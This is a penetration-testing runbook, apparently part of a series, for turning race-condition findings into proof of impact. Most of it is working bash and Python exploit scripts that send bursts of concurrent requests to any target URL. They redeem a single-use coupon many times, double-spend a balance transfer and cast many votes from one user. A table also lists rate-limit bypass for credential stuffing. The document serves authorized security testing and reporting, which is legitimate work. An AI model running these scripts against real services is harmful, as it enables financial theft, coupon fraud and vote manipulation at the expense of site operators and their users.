# Race Condition — Runbook 04: Impact Escalation

## Purpose
Escalate from detection to demonstrable impact. Show financial loss, resource abuse, or unauthorized access. ALL commands are SAFE — use test accounts and minimal values.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated cookie jar
- `$EVIDENCE_DIR` — evidence directory

---

## W4.1 — Demonstrate coupon/voucher multi-redeem

```bash
COUPON_ENDPOINT="$TARGET_URL/api/redeem"
COUPON_CODE="TEST-LEGIT-ONCE"

python3 -c "
import urllib.request, concurrent.futures, json, time

url = '$COUPON_ENDPOINT'
data = json.dumps({'code': '$COUPON_CODE'}).encode()
results = []

def redeem(i):
    try:
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        resp = urllib.request.urlopen(req, timeout=10)
        body = json.loads(resp.read())
        return {'req': i, 'status': resp.status, 'success': body.get('success'), 'message': body.get('message','')}
    except Exception as e:
        return {'req': i, 'status': 0, 'success': None, 'message': str(e)}

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
    futures = [ex.submit(redeem, i) for i in range(15)]
    for f in concurrent.futures.as_completed(futures):
        r = f.result()
        status = 'SUCCESS' if r['success'] else 'FAIL'
        print(f\"Request {r['req']}: {r['status']} ({status}) -> {r['message'][:80]}\")
        results.append(r)

successes = sum(1 for r in results if r['success'])
print(f'\\n=== {successes} of 15 concurrent redeems SUCCEEDED ===')
if successes > 1:
    print('IMPACT: Single-use coupon redeemed multiple times')
    print(f'Loss multiplier: {successes}x')
" | tee "$EVIDENCE_DIR/impact-coupon-multiredeem.txt"
```

## W4.2 — Demonstrate balance/transfer double-spend

```bash
# WARNING: Only test with test accounts and minimal amounts
TRANSFER_ENDPOINT="$TARGET_URL/api/transfer"
AMOUNT="0.01"

# Pre-state snapshot
curl -s "$TARGET_URL/api/balance" ${COOKIE_JAR:+-b "$COOKIE_JAR"} > "$EVIDENCE_DIR/impact-pre-balance.txt"

python3 -c "
import urllib.request, concurrent.futures, json

url = '$TRANSFER_ENDPOINT'
data = json.dumps({'to': 'test-receiver', 'amount': '$AMOUNT'}).encode()
results = []

def transfer(i):
    try:
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        resp = urllib.request.urlopen(req, timeout=10)
        body = json.loads(resp.read())
        return {'req': i, 'status': resp.status, 'success': 'error' not in body}
    except Exception as e:
        return {'req': i, 'status': 0, 'success': False}

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    futures = [ex.submit(transfer, i) for i in range(10)]
    for f in concurrent.futures.as_completed(futures):
        r = f.result()
        results.append(r)
        print(f\"Transfer {r['req']}: {'OK' if r['success'] else 'FAILED'} (HTTP {r['status']})\")

successes = sum(1 for r in results if r['success'])
print(f'\\nIMPACT: {successes} of 10 concurrent transfers of \$$AMOUNT succeeded')
if successes > 1:
    print(f'Potential loss: \${successes * float(\"$AMOUNT\"):.2f} (vs expected \$0.01)')
" | tee "$EVIDENCE_DIR/impact-double-spend.txt"

sleep 2
curl -s "$TARGET_URL/api/balance" ${COOKIE_JAR:+-b "$COOKIE_JAR"} > "$EVIDENCE_DIR/impact-post-balance.txt"

echo "=== Pre-balance ==="
cat "$EVIDENCE_DIR/impact-pre-balance.txt"
echo "=== Post-balance ==="
cat "$EVIDENCE_DIR/impact-post-balance.txt"
```

## W4.3 — Demonstrate voting/claim multi-count

```bash
VOTE_ENDPOINT="$TARGET_URL/api/vote"

python3 -c "
import urllib.request, concurrent.futures

url = '$VOTE_ENDPOINT'
data = b'option=target-option'
results = []

def vote(i):
    try:
        req = urllib.request.Request(url, data=data, method='POST')
        resp = urllib.request.urlopen(req, timeout=10)
        return (i, resp.status, 'OK')
    except:
        return (i, 0, 'FAIL')

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    futures = [ex.submit(vote, i) for i in range(20)]
    for f in concurrent.futures.as_completed(futures):
        i, status, msg = f.result()
        results.append(i)
        print(f'Vote {i}: HTTP {status} -> {msg}')

print(f'\\nIMPACT: {len(results)} votes cast from single user (expected: 1)')
" | tee "$EVIDENCE_DIR/impact-multivote.txt"
```

## W4.4 — Impact summary generation

```bash
cat > "$EVIDENCE_DIR/impact-summary.txt" << 'IMPACTOF'
Race Condition Impact Analysis
==============================

Endpoint categories and potential impact:

COUPON / VOUCHER REDEMPTION:
  - Single-use codes redeemable multiple times
  - Impact: Financial loss, inventory abuse
  - Severity: HIGH (direct financial)

BALANCE TRANSFER / WITHDRAWAL:
  - Double-spend / over-withdrawal
  - Impact: Direct financial theft
  - Severity: CRITICAL

VOTING / CLAIM / LIMITED RESOURCES:
  - Multiple votes or claims from single user
  - Impact: Fairness violation, resource exhaustion
  - Severity: MEDIUM-HIGH

RATE LIMIT BYPASS:
  - Brute force protection defeated
  - Impact: Account takeover via credential stuffing
  - Severity: HIGH

TOCTOU (FILE PROCESSING):
  - File replaced between validation and use
  - Impact: Malware upload, SSRF, content injection
  - Severity: MEDIUM-HIGH

REGISTRATION / INVITE CODES:
  - Unlimited accounts via single invite
  - Impact: Abuse, spam
  - Severity: MEDIUM
IMPACTOF

echo "Impact summary written to $EVIDENCE_DIR/impact-summary.txt"
```

---

## Evidence for Report

| Artifact | How to Capture |
|---|---|
| Pre-state snapshot | curl pre-balance.txt |
| Post-state snapshot | curl post-balance.txt |
| Concurrent request log | Python script output showing all success/fail |
| State delta proof | diff or numerical delta between pre and post |
| Multiplier calculation | N successes / 1 expected |

---

## Next Routing

| Result | Route |
|---|---|
| Impact demonstrated (multi-redeem, double-spend, multi-vote) | -> 05-evidence-collection.md |
| Impact marginal (2x instead of massive multiplier) | -> Still reportable -- collect evidence |
| No impact (all concurrent blocked) | -> 06-false-positive-filter.md |
